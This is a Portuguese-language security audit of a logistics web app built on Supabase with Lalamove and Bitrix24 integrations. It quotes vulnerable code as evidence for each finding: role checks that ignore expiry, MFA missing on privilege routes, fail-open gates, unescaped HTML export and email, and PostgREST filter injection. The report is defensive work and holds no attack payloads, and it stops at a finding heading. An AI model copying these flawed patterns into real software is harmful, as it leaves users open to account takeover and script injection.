Quem pode ver o quê foi implementado na interface, tela por tela, sem uma fonte única: o menu lateral, o menu do celular e a busca rápida de comandos têm cada um a sua lista de destinos, e duas delas nunca receberam filtro de papel — um visualizador vê e toca em Aprovações, Webhooks e Regras de Risco. A exigência de segundo fator cobre 7 das 49 telas e deixa de fora justamente as que distribuem poder. E quando a consulta de permissão falha, o sistema decide sozinho: num caso tranca o usuário legítimo fora, no outro libera o segundo fator. Papel já vencido ainda abre porta, e a troca de usuário não limpa o que ficou em memória.

**9 achado(s) sob esta causa.**


#### A-021 — UI concede acesso por papel já expirado (front-end ignora expires_at que o banco respeita)

- **Camada:** Interface — rotas e RBAC (+ 1 outro(s) local)
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem recebeu acesso temporário (ex.: gerente de férias, consultor) continua entrando nas telas de administração depois do prazo. As telas abrem, mas os dados vêm vazios ou com erro, porque o banco já nega — dá a impressão de sistema quebrado e, pior, mantém o menu de administrador visível para quem não deveria mais tê-lo.
- **Evidência:**
  ```
  src/hooks/usePermissions.ts:45-49 — `.from('user_roles')` / `.select('*')` / `.eq('user_id', user.id)` / `.eq('is_active', true);` | src/hooks/usePermissions.ts:100-103 — `return userRoles.some(r => r.role === role && r.is_active);` | supabase/migrations/20260712210653_6e89d2ad-c5be-4089-8af5-661a47ae8899.sql:12-14 — `AND is_active = true` / `AND (expires_at IS NULL OR expires_at > now())`
  ```
  Mesma causa, outro local — Hooks e estado — auth, permissão e infra:
  ```
  src/hooks/usePermissions.ts:46-50 e :101-104 (sem `expires_at`) vs supabase/migrations/20260712210653_6e89d2ad-c5be-4089-8af5-661a47ae8899.sql:13-14 `AND (expires_at IS NULL OR expires_at > now())`; e src/pages/RolesPage.tsx:81-86, que atribui papel sem nunca enviar `expiresAt`
  ```
- **Causa raiz:** A consulta que alimenta `hasRole()` (usada por ProtectedRoute.tsx:55-57 e por getHighestRole no Sidebar.tsx:31) filtra só `is_active=true`. A função `has_role()` do Postgres, que governa as RLS, também exige `expires_at > now()`. As duas camadas divergem, então um papel temporário vencido continua valendo na interface.
- **Arquivos:** `src/components/auth/ProtectedRoute.tsx`, `src/components/layout/Sidebar.tsx`, `src/hooks/usePermissions.ts`, `src/hooks/useRole.ts`, `src/lib/roles.ts`
- **Etapas do plano:** 036

#### A-022 — requireMFA cobre 7 de 49 rotas e deixa de fora exatamente as que concedem privilégio (/roles, /permissions, /ip-whitelist)

- **Camada:** Interface — rotas e RBAC
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem tiver apenas a senha de um administrador (sem o celular do segundo fator) entra no sistema e consegue abrir a tela que distribui papéis, a lista de permissões, a whitelist de IP e a aprovação de reset de senha. O segundo fator, que foi configurado justamente para proteger a conta, hoje só tranca 7 telas de integração.
- **Evidência:**
  ```
  src/App.tsx:161 — `<Route path="/roles" element={<ProtectedRoute requiredRole="admin"><SuspenseWrapper><RolesPage /></SuspenseWrapper></ProtectedRoute>} />` (sem requireMFA) | src/components/auth/ProtectedRoute.tsx:49-50 — `if (requireMFA && needsMFAVerification) {` / `return <Navigate to="/mfa-verify" state={{ from: location }} replace />;` | src/hooks/useMFA.ts:56-57 — `const needsMFAVerification = aalLevel?.currentLevel === 'aal1' && aalLevel?.nextLevel === 'aal2';`
  ```
- **Causa raiz:** MFA é aplicado por rota, não por sessão. `needsMFAVerification` (src/hooks/useMFA.ts:56-57) é calculado para toda sessão aal1 com fator verificado, mas ProtectedRoute só age nas 7 rotas que declaram `requireMFA` (App.tsx:195,197,198,199,200,201,208). Nas outras 42, uma sessão que parou no primeiro fator entra normalmente.
- **Arquivos:** `src/components/auth/ProtectedRoute.tsx`, `src/App.tsx`, `src/pages/RolesPage.tsx`, `docs/pendencias/_regras-de-negocio.md`
- **Etapas do plano:** 037, 038

#### M-084 — Falha transitória na RPC de permissões tranca o usuário em /unauthorized até recarregar a página

- **Camada:** Hooks e estado — auth, permissão e infra
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Uma oscilação de rede de um segundo faz o operador ser mandado para a tela "sem permissão" e ficar preso ali — ele acha que perdeu o acesso e abre chamado, quando bastaria recarregar a página.
- **Evidência:**
  ```
  src/hooks/usePermissions.ts:42-56 (query `user-roles`, `if (error) throw error`) + :102 `if (!userRoles) return false;` + src/components/auth/ProtectedRoute.tsx:27 (`if (authLoading || permissionsLoading || ...)`) e :59-67 (`<Navigate to="/unauthorized" ...>`) + src/App.tsx:93-94 `refetchOnWindowFocus: false,` / `retry: 1,`
  ```
- **Causa raiz:** O gate de permissão trata "não sei" como "não pode" e o ProtectedRoute só olha `isLoading`, nunca `isError`. Com `retry: 1` e `refetchOnWindowFocus: false`, a query em estado de erro não se recupera sozinha: toda navegação para uma rota com `requiredPermission` volta a cair no redirecionamento.
- **Arquivos:** `src/hooks/usePermissions.ts`, `src/components/auth/ProtectedRoute.tsx`, `src/App.tsx`
- **Etapas do plano:** 179

#### M-086 — Gate de MFA abre quando a consulta de nível de autenticação falha

- **Camada:** Hooks e estado — auth, permissão e infra
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** As telas que exigem segundo fator (regras de risco, webhooks, integrações, chaves da Lalamove/UAPI) podem ser abertas sem o segundo fator se a verificação de nível falhar. As gravações continuam barradas pelo banco, mas a camada extra de proteção da tela deixa de existir.
- **Evidência:**
  ```
  src/hooks/useMFA.ts:56-61 — `const needsMFAVerification = aalLevel?.currentLevel === 'aal1' && aalLevel?.nextLevel === 'aal2';` / `const needsMFAEnrollment = !!user && aalLevel?.currentLevel === 'aal1' && aalLevel?.nextLevel !== 'aal2';`; src/components/auth/ProtectedRoute.tsx:44-51 — `if (requireMFA && needsMFAEnrollment) { ... } if (requireMFA && needsMFAVerification) { ... }` (nenhum ramo de erro)
  ```
- **Causa raiz:** Os sinais derivados colapsam "não sei" em "não precisa": são `undefined ? ... : false` por construção. Com `retry: 1` e `refetchOnWindowFocus: false` no cliente global (src/App.tsx:93-94), a query de AAL em erro não se recupera e o guard segue liberando.
- **Arquivos:** `src/hooks/useMFA.ts`, `src/components/auth/ProtectedRoute.tsx`, `src/App.tsx`
- **Etapas do plano:** 181
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Não tenho como provocar o erro em produção sem acesso (bloquear a chamada no navegador do dono ou ver log). `getAuthenticatorAssuranceLevel()` é local no supabase-js, então o erro depende de sessão corrompida/ausente; `listFactors()` é de rede e falha mais fácil, mas só alimenta `isMFAEnabled`. Confirma-se bloqueando a requisição de fatores/AAL no DevTools e tentando abrir /risk-rules.

#### M-100 — /reset-password aceita qualquer sessão ativa, não só o link de recuperação — troca de senha sem pedir a senha atual

- **Camada:** Interface — rotas e RBAC
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Em um computador compartilhado ou deixado destravado, quem senta na frente abre /reset-password e troca a senha da conta sem precisar saber a senha atual — e passa a ser o dono do acesso. Vale também para uma sessão roubada: o invasor fecha a porta atrás de si.
- **Evidência:**
  ```
  src/pages/ResetPasswordPage.tsx:37-38 `      const { data: { session } } = await supabase.auth.getSession();` / `      setIsValidSession(!!session);` + :74 `      const { error } = await supabase.auth.updateUser({ password });` + src/App.tsx:148 `                    <Route path="/reset-password" element={<SuspenseWrapper><ResetPasswordPage /></SuspenseWrapper>} />`
  ```
- **Causa raiz:** A tela foi escrita para o fluxo de link de e-mail (ForgotPasswordPage.tsx:34-36 aponta `redirectTo: .../reset-password`), mas o gate de validade virou "existe sessão?" em vez de "esta sessão veio de um PASSWORD_RECOVERY". A rota é pública (App.tsx:148), então basta estar logado e digitar o endereço.
- **Arquivos:** `src/pages/ResetPasswordPage.tsx`, `src/pages/ForgotPasswordPage.tsx`, `src/App.tsx`
- **Etapas do plano:** 195

#### M-132 — Command palette lista todas as rotas de administração sem filtro de papel e fica ativa na tela pública de login

- **Camada:** Interface — rotas e RBAC
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa que chegue à tela de login pode apertar Ctrl+K e ver o mapa completo do sistema, inclusive as telas de gestão de papéis, whitelist de IP e aprovação de reset de senha. Não vaza dado de cliente, mas entrega a um atacante a lista exata do que vale atacar. Para quem já está logado como viewer, a paleta ainda oferece esses atalhos e cada um termina em "Acesso Negado".
- **Evidência:**
  ```
  src/hooks/useCommandPaletteSearch.ts:166 `    { id: 'roles', label: 'Roles', icon: Users, path: '/roles', keywords: ['permissoes', 'usuarios', 'cargos'], category: 'security' },` + :174 `  ], []);` + :113 `      if ((e.key === 'k' && (e.metaKey || e.ctrlKey)) || (e.key === '/' && !['INPUT', 'TEXTAREA'].includes((e.target as HTMLElement)?.tagName))) {` + src/App.tsx:140 `                <CommandPaletteEnhanced />`
  ```
- **Causa raiz:** A lista de navegação da paleta é uma terceira cópia estática dos destinos (ao lado de sidebar-config e MobileBottomNav) e nunca recebeu filtro de papel; e a paleta foi montada no topo da árvore, fora do `AppLayout`, para funcionar em qualquer rota — o que inclui as rotas públicas.
- **Arquivos:** `src/hooks/useCommandPaletteSearch.ts`, `src/components/CommandPaletteEnhanced.tsx`, `src/App.tsx`
- **Etapas do plano:** 256

#### M-133 — Menu lateral não sabe expressar o papel 'operator', então o viewer vê 7 itens que a rota recusa

- **Camada:** Interface — rotas e RBAC
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um usuário de consulta abre o sistema e vê Pedidos, Motoristas, Contatos, Incidentes, Alertas, Avaliações e Operações Lalamove no menu; ao clicar em qualquer um, leva "Acesso Negado". Sete becos sem saída no menu principal de quem só deveria ver indicadores.
- **Evidência:**
  ```
  src/components/layout/sidebar-config.ts:15 `  requiredRole?: 'admin' | 'manager';` (dentro de `export interface MenuItem`, :9) e :24 (idem em MenuCategory); src/components/layout/sidebar-config.ts:33 `      { id: 'orders', path: '/orders', label: 'Pedidos', icon: Package },`; src/components/layout/Sidebar.tsx:58 `  const hasRequiredRole = (required?: 'admin' | 'manager') => meetsRole(userRole, required);`
  ```
- **Causa raiz:** O contrato de `MenuItem`/`MenuCategory` foi escrito com dois papéis quando a hierarquia tem quatro (src/lib/roles.ts:10). Itens cuja rota exige 'operator' não têm como declarar isso e passam pelo filtro como se fossem públicos a qualquer autenticado. O teste que deveria pegar isso é limitado de propósito: src/lib/__tests__/sidebarRoutes.test.ts:75 — `if (routeRole && roleLevel(routeRole) >= ROLE_LEVEL.manager) {` — ou seja, só verifica manager e admin.
- **Arquivos:** `src/components/layout/sidebar-config.ts`, `src/components/layout/Sidebar.tsx`, `src/components/layout/MobileSidebar.tsx`, `src/lib/__tests__/sidebarRoutes.test.ts`, `src/App.tsx`
- **Etapas do plano:** 257

#### M-134 — Navegação mobile ignora o RBAC por completo: viewer vê e toca em Aprovações, Webhooks, Regras de Risco e Configurações

- **Camada:** Interface — rotas e RBAC
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** No celular, um usuário de consulta ou operador vê botões de aprovação, webhooks e configurações e, ao tocar, recebe "Acesso Negado". Além de frustrar a equipe de campo, expõe que essas funções existem e parece que o sistema está com defeito.
- **Evidência:**
  ```
  src/components/layout/MobileBottomNav.tsx:94 `{ id: 'approvals', label: 'Aprovações', icon: Shield, path: '/approvals', badge: pendingApprovalsCount, critical: pendingApprovalsCount >= 5 },` + :239 `{Object.entries(groupedMenuItems).map(([category, items]) => (` (render sem filtro) + src/components/auth/ProtectedRoute.tsx:59-66 `if (!hasRequiredRole) { return (<Navigate to="/unauthorized" replace ...`
  ```
- **Causa raiz:** O MobileBottomNav tem sua própria lista estática de destinos (MobileBottomNav.tsx:46-63 e :86-97), paralela ao sidebar-config, e nunca recebeu o filtro de papel que o Sidebar aplica (Sidebar.tsx:58-60).
- **Arquivos:** `src/components/layout/MobileBottomNav.tsx`, `src/components/layout/sidebar-config.ts`, `src/components/layout/Sidebar.tsx`
- **Etapas do plano:** 258

#### B-018 — Cache de permissões e de dados administrativos sobrevive à troca de usuário quando a sessão cai sem signOut explícito

- **Camada:** Hooks e estado — auth, permissão e infra
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Em máquina compartilhada do CD, se a sessão de um administrador cai e outra pessoa entra em seguida, as telas de papéis, matriz de permissões e IPs bloqueados aparecem por alguns instantes com os dados do administrador anterior, antes de serem substituídas.
- **Evidência:**
  ```
  src/hooks/useAuth.tsx:27-32 — `supabase.auth.onAuthStateChange((_event, nextSession) => { if (!mounted) return; setSession(nextSession); setUser(nextSession?.user ?? null); })` (nenhuma limpeza); src/hooks/useAuth.tsx:71-72 — `queryClient.clear(); supabase.removeAllChannels();` só no signOut; src/App.tsx:99-104 — `let browserQueryClient: QueryClient | undefined; ... if (!browserQueryClient) browserQueryClient = makeQueryClient();`
  ```
- **Causa raiz:** A invalidação de cache está acoplada ao botão de sair, não ao evento de autenticação. Sessão expirada, revogada ou encerrada em outra aba chega por `onAuthStateChange` (SIGNED_OUT / falha de refresh) e esse caminho não limpa nada; como as chaves de permissão globais não incluem o id do usuário, o próximo login reaproveita as entradas do usuário anterior (gcTime de 5 min, src/App.tsx:92).
- **Arquivos:** `src/hooks/useAuth.tsx`, `src/App.tsx`, `src/hooks/usePermissions.ts`, `src/hooks/useRole.ts`, `src/hooks/useRateLimiting.ts`
- **Etapas do plano:** 200


## Causa raiz: Texto digitado ou vindo do banco é usado cru, sem validação no servidor nem tratamento

Nada no caminho entre o que a pessoa digita e o destino final confere ou neutraliza o texto. Na busca, o termo é colado dentro da consulta ao banco, então uma vírgula ou um parêntese em "Silva, João" muda o sentido do filtro e a lista quebra ou devolve o resultado errado. Na exportação em PDF e no e-mail de alerta, nome de motorista e endereço são colados dentro de uma página web sem tratamento. Nos formulários, a validação existe só no navegador: raio negativo, faixa de endereço de rede inválida, tempo crítico menor que o de aviso, número de página inexistente e planilha com a coluna errada como identificador chegam intactos ao banco.

**11 achado(s) sob esta causa.**


#### A-020 — Exportação em PDF injeta texto do banco no HTML sem escapar, em janela de mesma origem

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Basta um pedido chegar com nome de departamento ou endereço contendo marcação para que, ao gerar o PDF, código de terceiro rode dentro da sessão de quem clicou — com acesso ao login do usuário. Os dados de pedido vêm de integração externa (Bitrix24/webhook), então o texto não é confiável.
- **Evidência:**
  ```
  src/utils/exportUtils.ts:100, :112-113 e :118-124; src/pages/AdvancedReportsPage.tsx:214 e :222; src/pages/ReportsPage.tsx:90
  ```
- **Causa raiz:** Conteúdo vindo do banco (nome de departamento, centro de custo, região extraída do endereço, nome de motorista) é concatenado em HTML sem escape e escrito via document.write numa janela aberta com `about:blank`, que herda a origem da aplicação — portanto com acesso ao localStorage onde fica a sessão do Supabase.
- **Arquivos:** `src/utils/exportUtils.ts`, `src/pages/AdvancedReportsPage.tsx`, `src/pages/ReportsPage.tsx`, `src/pages/AnalyticsDashboardPage.tsx`
- **Etapas do plano:** 035

#### M-014 — E-mail montado por concatenação de HTML sem escape, com texto vindo do banco e do chamador

- **Camada:** Backend — notificação e fila
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um endereço ou nome cadastrado com caracteres de HTML quebra o layout do e-mail de alerta; e quem controla esses campos consegue inserir link ou texto falso dentro de um e-mail que chega com a cara da empresa. No alerta de novo dispositivo isso vira ferramenta de golpe, porque o e-mail já é sobre segurança.
- **Evidência:**
  ```
  supabase/functions/send-notification/index.ts:1263-1270 `<h1 style="margin: 0; font-size: 20px;">${getSeverityEmoji(severity)} ${title}</h1>` … `<p style="color: #374151; line-height: 1.6; margin: 0 0 16px 0;">${message}</p>`; supabase/functions/_shared/template.ts:56 `return String(value);`; supabase/functions/new-device-alert/index.ts:202-213 `<td>${browser || "Desconhecido"}</td>` … `<td>${ipAddress}</td>`.
  ```
- **Causa raiz:** `message` chega de `renderTemplate(cfg.message_template, templateVars)` (index.ts:797), com variáveis que vêm do banco (`pickup_address`, `driver_name`, `share_link`, `order_ref` — index.ts:504-523) e de `metadata` do chamador; `title`/`orderId`/`driverId` vêm do corpo validado apenas como string. Nada é escapado antes de virar HTML. Em `new-device-alert` todos os campos exibidos vêm do corpo da requisição.
- **Arquivos:** `supabase/functions/send-notification/index.ts`, `supabase/functions/_shared/template.ts`, `supabase/functions/new-device-alert/index.ts`
- **Etapas do plano:** 052

#### M-057 — Atribuir papel exige UUID digitado à mão e revogar não pede confirmação

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Para dar acesso a alguém é preciso descobrir e copiar um identificador técnico, com risco de atribuir papel de administrador ao usuário errado; e tirar o acesso de alguém acontece no primeiro clique, sem pergunta.
- **Evidência:**
  ```
  src/pages/RolesPage.tsx:341-346 (Input de UUID livre), :78 e :384 (único bloqueio é string vazia), :92-94 e :248-254 (revogação sem AlertDialog), :228 (só 8 chars do UUID); src/hooks/useRole.ts:70-95
  ```
- **Causa raiz:** O diálogo de atribuição não tem busca de usuário nem validação de formato (o único bloqueio é `!newUserData.userId`, :78 e :381), e a revogação dispara a mutation no clique, sem AlertDialog. A lista de usuários também só exibe os 8 primeiros caracteres do UUID (:221), então não há como conferir quem é quem.
- **Arquivos:** `src/pages/RolesPage.tsx`, `src/hooks/useRole.ts`
- **Etapas do plano:** 136

#### M-058 — Validação de IP rejeita IPv6 abreviado, inclusive o exemplo do próprio formulário

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O administrador copia o formato que a própria tela sugere para liberar um IPv6 e recebe 'Formato de IP inválido', sem saber o que corrigir. Na prática a whitelist só aceita IPv4 (ou IPv6 escrito por extenso).
- **Evidência:**
  ```
  src/pages/IPWhitelistPage.tsx:21 — `ip_address: z.string().min(7).max(45).regex(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$|^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/, 'Formato de IP inválido')`; bloqueio efetivo em src/pages/IPWhitelistPage.tsx:81 `ipSchema.parse(formData);`. Placeholder em src/pages/ip-whitelist/IPWhitelistDialogs.tsx:53 `placeholder="192.168.1.1 ou 2001:db8::1"`.
  ```
- **Causa raiz:** O ramo IPv6 da expressão exige os 8 grupos completos e não aceita a compressão `::`, e o `min(7)` ainda barra endereços curtos. O placeholder foi escrito supondo um validador mais permissivo.
- **Arquivos:** `src/pages/IPWhitelistPage.tsx`, `src/pages/ip-whitelist/IPWhitelistDialogs.tsx`
- **Etapas do plano:** 137

#### M-059 — Raio e ETA de aproximacao do pedido so sao validados pelo navegador: valor negativo desliga o aviso em silencio

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um pedido salvo com raio negativo nunca dispara o aviso de 'motorista chegando' para o cliente, e nada na tela indica isso — o operador acha que configurou o aviso.
- **Evidência:**
  ```
  src/components/orders/NewOrderDialog.tsx:987-994 e :445; supabase/functions/_shared/schemas.ts:856-857 `approachRadiusM: z.number().optional()`; supabase/functions/lalamove-api/index.ts:767-768; supabase/migrations/20261122130100_geo_foundation.sql:217-218 (sem CHECK); gatilho vivo em supabase/migrations/20261122131000_geo_eta_delay.sql:82 e :173/:192
  ```
- **Causa raiz:** O `min={0}` do input nao bloqueia digitacao (o dialogo nao tem elemento <form> nem validacao no envio), a edge so confere o tipo e a coluna nao tem restricao. O gatilho compara a distancia com esse valor (geo_foundation.sql:429 `v_radius := COALESCE(o.approach_radius_m, d.approach_radius_m);`), entao um numero negativo torna a condicao impossivel.
- **Arquivos:** `src/components/orders/NewOrderDialog.tsx`, `supabase/functions/lalamove-api/index.ts`, `supabase/migrations/20261122130100_geo_foundation.sql`
- **Etapas do plano:** 138

#### M-076 — Importacao de CSV adota a primeira coluna como ID quando nao reconhece o cabecalho, sem limite de linhas nem como cancelar

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Escolher o arquivo errado (ou um CSV com outro layout) dispara centenas de consultas pagas a Lalamove com identificadores inventados, todas falhando, e o operador fica preso na tela ate terminar.
- **Evidência:**
  ```
  src/components/orders/ImportCSVDialog.tsx:46 (fallback `|| headers[0]`), :48-51 (erro inalcancavel), :55 (`id.length > 5`), :78-105 (laco sem teto/abort), :131 (dialogo travado com `importing`)
  ```
- **Causa raiz:** O fallback para `headers[0]` aceita qualquer coluna como identificador, e o unico criterio e ter mais de 5 caracteres — datas, nomes e enderecos passam. Em seguida o laco dispara lotes de 20 a edge `lalamove-api` ate acabar o arquivo, sem teto de linhas e sem caminho de interrupcao: o dialogo nao fecha enquanto `importing` for true.
- **Arquivos:** `src/components/orders/ImportCSVDialog.tsx`
- **Etapas do plano:** 158

#### M-123 — Filtro de busca sem escape: virgula ou parentese no termo quebram a consulta da lista de pedidos

- **Camada:** Interface — fluxo de pedido (+ 1 outro(s) local)
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Procurar um cliente escrevendo 'Sobrenome, Nome' derruba a tela de pedidos com 'Erro ao Carregar' em vez de devolver resultado — e um termo construido de proposito consegue mudar o filtro da consulta.
- **Evidência:**
  ```
  src/hooks/useRecentOrders.ts:36-38 `if (query && query.trim()) { supabaseQuery = supabaseQuery.or(`lalamove_id.ilike.%${query}%,customer_name.ilike.%${query}%,internal_order_id.ilike.%${query}%`); }` | src/pages/OrdersPage.tsx:29 `const q = searchParams.get('q') || '';` e :78 `const { data: ordersData, isLoading, error, isFetching } = useRecentOrders(currentPage, statusFilter, q);`
  ```
  Mesma causa, outro local — Hooks e estado — dados de negócio:
  ```
  src/hooks/useRecentOrders.ts:37 `supabaseQuery = supabaseQuery.or(`lalamove_id.ilike.%${query}%,customer_name.ilike.%${query}%,internal_order_id.ilike.%${query}%`);`; src/pages/OrdersPage.tsx:78 `const { data: ordersData, isLoading, error, isFetching } = useRecentOrders(currentPage, statusFilter, q);`
  ```
- **Causa raiz:** O termo digitado e interpolado cru dentro da string de filtro do PostgREST, que usa virgula para separar condicoes e parenteses para agrupar. Um termo com virgula ('Silva, Maria'), parentese ou ponto vira sintaxe de filtro: a consulta e recusada (a OrdersPage cai no bloco de erro em OrdersPage.tsx:120-135) ou passa a filtrar por outra condicao que o usuario nao pediu, inclusive sobrescrevendo o filtro de status aplicado em useRecentOrders.ts:32-34.
- **Arquivos:** `src/hooks/useRecentOrders.ts`, `src/pages/OrdersPage.tsx`
- **Etapas do plano:** 247

#### M-126 — Busca de erros monta o filtro do PostgREST por concatenação: vírgula ou parêntese no termo quebra a consulta

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Pesquisar por um texto com vírgula ou parêntese — comum em mensagens de erro — devolve erro ou uma lista errada, e o operador conclui que não há aquele erro registrado.
- **Evidência:**
  ```
  src/hooks/useErrorLogs.ts:65; src/pages/ErrorMonitoringPage.tsx:183,192,236-240
  ```
- **Causa raiz:** O termo digitado entra cru na sintaxe de filtro do PostgREST, onde vírgula separa condições e parênteses delimitam o grupo. Um termo como `a,b` ou `Error (500)` muda a estrutura do filtro.
- **Arquivos:** `src/hooks/useErrorLogs.ts`, `src/pages/ErrorMonitoringPage.tsx`
- **Etapas do plano:** 250

#### B-045 — Alerta crítico pode ser salvo com tempo menor que o de aviso

- **Camada:** Interface — administração
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A configuração de monitoramento de motorista parado fica incoerente: o limite 'crítico' é menor que o de 'aviso', então a escalada de severidade do alerta deixa de fazer sentido para a operação.
- **Evidência:**
  ```
  src/pages/settings/StoppedDriverCard.tsx:60 — `<Slider id="stopped-critical" value={[settings.stopped_critical_minutes]} ... min={settings.stopped_alert_minutes + 1} max={60} step={1} />`; src/hooks/useAlertSettings.ts:131-134 `const updateSetting = <K extends keyof AlertSettings>(key: K, value: AlertSettings[K]) => { setSettings(prev => ({ ...prev, [key]: value })); setHasChanges(true); };`. Consumidor ignora os valores: supabase/functions/check-driver-alerts/index.ts:143-144 `const warningThreshold = order.stalled_threshold_minutes || DEFAULT_STOPPED_WARNING_MINUTES; const criticalThreshold = warningThreshold * 2;`.
  ```
- **Causa raiz:** A coerência entre 'tempo de aviso' e 'tempo crítico' é garantida só pelo `min` dinâmico do slider, que afeta a interação mas não corrige o valor já em memória. Aumentando o aviso para além do crítico (ex.: aviso 20, crítico 10), o estado continua com crítico 10 e o botão Salvar grava essa combinação.
- **Arquivos:** `src/pages/settings/StoppedDriverCard.tsx`, `src/hooks/useAlertSettings.ts`, `src/pages/SettingsPage.tsx`
- **Etapas do plano:** 265

#### B-048 — Parametro de pagina da URL nao e validado e vai direto para o intervalo da consulta

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Baixa · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Um link antigo, um favorito ou um endereco editado a mao derruba a tela de pedidos inteira em 'Erro ao Carregar', e o operador nao tem como saber que basta tirar o '?page=' do endereco.
- **Evidência:**
  ```
  src/pages/OrdersPage.tsx:31 (parseInt sem guarda), :78, :253; src/hooks/useRecentOrders.ts:19-20 e :42
  ```
- **Causa raiz:** `parseInt` devolve NaN para 'abc' e aceita 0 e negativos; nada normaliza o valor entre a URL e o `.range()`. Com NaN o intervalo vira NaN-NaN; com 0, `from` vira -20. Tambem nao ha limite superior: ?page=9999 produz uma pagina vazia sem reposicionar nem avisar.
- **Arquivos:** `src/pages/OrdersPage.tsx`, `src/hooks/useRecentOrders.ts`
- **Etapas do plano:** 268
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: A ausencia de validacao esta confirmada no codigo; falta uma requisicao real para registrar o que o PostgREST responde a um Range invalido (400/416) e se a tela cai no bloco de erro ou renderiza lista vazia.

#### B-062 — Campo CIDR da whitelist aceita qualquer texto e pode quebrar a função de verificação de IP no banco

- **Camada:** Interface — administração
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Um erro de digitação no campo 'CIDR Range' (por exemplo '192.168.1.0\\24') é aceito e salvo sem reclamar, e passa a derrubar a verificação de IP permitido para todo mundo assim que essa verificação for usada.
- **Evidência:**
  ```
  src/pages/IPWhitelistPage.tsx:23 — `cidr_range: z.string().optional(),`; :52 `cidr_range: data.cidr_range || null`. Sem CHECK no banco: supabase/migrations/20251231115949_817e6539-79a0-43fd-98e6-e7bb705cf1b2.sql:76 `cidr_range TEXT,` e :202 `AND (ip_address = _ip_address OR _ip_address << cidr_range::inet)`. Sem chamador: a função só aparece em supabase/migrations/20260711184140_...sql:10 `GRANT EXECUTE ON FUNCTION public.is_ip_whitelisted(inet)  TO service_role;` e em src/integrations/supabase/types.ts:4468.
  ```
- **Causa raiz:** O formulário valida o IP mas não o intervalo CIDR, e o banco guarda o valor como texto livre. A conversão `cidr_range::inet` acontece dentro de `is_ip_whitelisted`, então um valor malformado em uma única linha faz a função inteira lançar erro de sintaxe, para qualquer IP consultado.
- **Arquivos:** `src/pages/IPWhitelistPage.tsx`, `src/pages/ip-whitelist/IPWhitelistDialogs.tsx`
- **Etapas do plano:** 299


## Causa raiz: A integração foi escrita contra um contrato que a Lalamove e o Bitrix24 não têm

Partes da integração foram feitas supondo um contrato que nunca existiu ou que mudou: o sistema espera avisos por evento que a versão 3 da Lalamove não envia, consulta um endereço de verificação que não existe, assina a mensagem de forma incompatível quando ela passa pelo intermediário, lê o cabeçalho de quota com o nome errado e oferece extras pagos com códigos que o catálogo brasileiro não reconhece. Soma-se a isso a configuração errada do portão de entrada: o cancelamento devolve um formato que o programa proíbe e vira erro na tela mesmo tendo dado certo, o retorno da autorização do Bitrix24 é recusado antes de chegar ao código, e a renovação automática do acesso depende de um intermediário que nunca foi contratado — ou seja, nunca renova.

**12 achado(s) sob esta causa.**


#### A-013 — Renovação do token Bitrix24 quebrada em dois pontos: self-call sem Authorization e erro do provedor virando 500 genérico

- **Camada:** Integrações e contratos
